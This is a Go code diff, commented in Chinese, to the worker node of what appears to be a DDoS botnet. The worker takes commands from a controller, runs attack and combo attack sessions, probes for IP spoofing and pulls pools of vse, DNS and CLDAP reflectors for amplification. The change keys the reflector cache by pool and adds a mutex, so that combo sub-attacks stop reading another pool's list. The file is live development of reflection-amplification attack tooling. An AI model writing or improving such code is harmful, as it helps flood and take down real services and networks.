@@ -76,9 +76,13 @@ type Worker struct {
 	// 此期间 autoTuneThreads 不得改动全局带宽限速器，避免覆盖熔断降级设置。
 	degraded int32
 
-	reflectorCache     []string
-	reflectorVersions  map[string]string // poolID → 服务端版本号，用于缓存失效判断
-	reflectorLastFetch time.Time
+	// 反射器池缓存：按 poolID 分槽（"" = 全池）。
+	// 单槽缓存会被跨池污染——combo 子攻击依次拉 vse/dns/cldap，
+	// 后一个池会读到前一个池的列表（放大类型与目标池不匹配）。
+	reflectorCache     map[string][]string
+	reflectorVersions  map[string]string    // poolID → 服务端版本号，用于缓存失效判断
+	reflectorLastFetch map[string]time.Time // poolID → 上次拉取时间
+	reflectorMu        sync.Mutex
 
 	lastCPUPercent int32
 	lastMemoryMB   int64
@@ -116,21 +120,23 @@ const (
 
 func New(id, controllerAddr, authToken, proxySource string, maxBWMbps int) *Worker {
 	w := &Worker{
-		id:                id,
-		controller:        controllerAddr,
-		httpPort:          "8080",
-		authToken:         authToken,
-		proxySource:       proxySource,
-		maxBWMbps:         maxBWMbps,
-		activeTasks:       make(map[string]*attack.AttackSession),
-		activeComboTasks:  make(map[string]*attack.ComboSession),
-		isWindows:         runtime.GOOS == "windows",
-		statsIntervalMs:   500,
-		useLocalPool:      false,
-		spoofResultCh:     make(chan spoofProbeResult, 1),
-		autoTuneFactor:    1.0,
-		reflectorVersions: make(map[string]string),
-		selfVersion:       computeSelfVersion(),
+		id:                 id,
+		controller:         controllerAddr,
+		httpPort:           "8080",
+		authToken:          authToken,
+		proxySource:        proxySource,
+		maxBWMbps:          maxBWMbps,
+		activeTasks:        make(map[string]*attack.AttackSession),
+		activeComboTasks:   make(map[string]*attack.ComboSession),
+		isWindows:          runtime.GOOS == "windows",
+		statsIntervalMs:    500,
+		useLocalPool:       false,
+		spoofResultCh:      make(chan spoofProbeResult, 1),
+		autoTuneFactor:     1.0,
+		reflectorCache:     make(map[string][]string),
+		reflectorVersions:  make(map[string]string),
+		reflectorLastFetch: make(map[string]time.Time),
+		selfVersion:        computeSelfVersion(),
 	}
 
 	if maxBWMbps > 0 {
@@ -1514,30 +1520,38 @@ func (w *Worker) fetchReflectorsInto(targets *[]string, poolID string) {
 		return
 	}
 
-	w.reflectorCache = remoteTargets
+	w.reflectorMu.Lock()
+	w.reflectorCache[poolID] = remoteTargets
 	if poolID != "" {
 		w.reflectorVersions[poolID] = version
 	}
-	w.reflectorLastFetch = time.Now()
+	w.reflectorLastFetch[poolID] = time.Now()
+	w.reflectorMu.Unlock()
 	*targets = remoteTargets
 	log.Printf("[reflector] loaded %d reflectors from controller (pool=%s version=%s)", len(remoteTargets), poolID, version)
 }
 
+// getReflectorCache 返回指定池的缓存（按 poolID 分槽，避免跨池污染）。
 func (w *Worker) getReflectorCache(poolID string) []string {
-	if len(w.reflectorCache) == 0 {
+	w.reflectorMu.Lock()
+	defer w.reflectorMu.Unlock()
+	if len(w.reflectorCache[poolID]) == 0 {
 		return nil
 	}
 	if poolID != "" && w.reflectorVersions[poolID] == "" {
 		// 该池版本从未核对过，无法确认缓存仍与服务端一致
 		return nil
 	}
-	if time.Since(w.reflectorLastFetch) > 5*time.Minute {
-		w.refreshReflectorCache(poolID)
+	if time.Since(w.reflectorLastFetch[poolID]) > 5*time.Minute {
+		w.refreshReflectorCacheLocked(poolID)
+	}
+	if len(w.reflectorCache[poolID]) == 0 {
+		return nil
 	}
 	if poolID != "" && w.reflectorVersions[poolID] == "" {
 		return nil
 	}
-	return w.reflectorCache
+	return w.reflectorCache[poolID]
 }
 
 // fetchPoolVersion 查询指定池的服务端版本号；失败返回空串。
@@ -1559,7 +1573,8 @@ func (w *Worker) fetchPoolVersion(poolID string) string {
 	return v.Version
 }
 
-func (w *Worker) refreshReflectorCache(poolID string) {
+// refreshReflectorCacheLocked 刷新指定池缓存；调用方必须持有 reflectorMu。
+func (w *Worker) refreshReflectorCacheLocked(poolID string) {
 	// 仅对具名池做版本校验：版本一致说明缓存仍有效，刷新时间戳即可；
 	// "all"（poolID 为空）直接按 TTL 全量重拉。
 	version := ""
@@ -1569,7 +1584,7 @@ func (w *Worker) refreshReflectorCache(poolID string) {
 			return // 版本不可得，保留旧缓存等待下次重试
 		}
 		if version == w.reflectorVersions[poolID] {
-			w.reflectorLastFetch = time.Now()
+			w.reflectorLastFetch[poolID] = time.Now()
 			return
 		}
 	}
@@ -1589,11 +1604,11 @@ func (w *Worker) refreshReflectorCache(poolID string) {
 		return
 	}
 
-	w.reflectorCache = targets
+	w.reflectorCache[poolID] = targets
 	if poolID != "" {
 		w.reflectorVersions[poolID] = version
 	}
-	w.reflectorLastFetch = time.Now()
+	w.reflectorLastFetch[poolID] = time.Now()
 	log.Printf("[reflector] cache refreshed: %d targets (pool=%s version=%s)", len(targets), poolID, version)
 }
 
